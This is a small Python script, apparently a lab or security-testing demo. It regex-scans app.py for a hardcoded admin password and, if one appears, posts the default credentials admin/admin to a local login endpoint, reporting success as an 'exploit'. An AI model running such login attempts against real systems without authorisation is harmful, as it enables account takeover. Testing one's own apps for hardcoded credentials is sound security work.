import re
import requests

# File path 
file_path = "app.py"

# Regular expression `
hardcoded_password_pattern = re.compile(r'ADMIN_PASSWORD\s*=\s*["\'].*["\']')

# Scan the file for hardcoded passwords
def detect_hardcoded_password(file_path):
    with open(file_path, 'r') as file:
        for line_number, line in enumerate(file, start=1):
            if hardcoded_password_pattern.search(line):
                print(f"Hardcoded password detected on line {line_number}: {line.strip()}")
                return True
    return False

# Exploit function to log in as admin with hardcoded credentials
def exploit_login():
    # URL of the login endpoint
    url = "http://127.0.0.1:5001/login"  

    # Hardcoded credentials found in app.py
    username = "admin"
    password = "admin"  # Exploiting the hardcoded admin password

    # Attempt to log in as admin
    response = requests.post(url, data={"username": username, "password": password})

    # Check response status
    if response.status_code == 200:
        print("Exploit successful! Logged in as admin.")
        print("Response content:", response.text)
    else:
        print("Exploit failed. Access denied.")

# Run detection and exploit only if a hardcoded password is found
if detect_hardcoded_password(file_path):
    print("Proceeding with exploit due to hardcoded password.")
    exploit_login()
else:
    print("No hardcoded password found. Exploit aborted.")
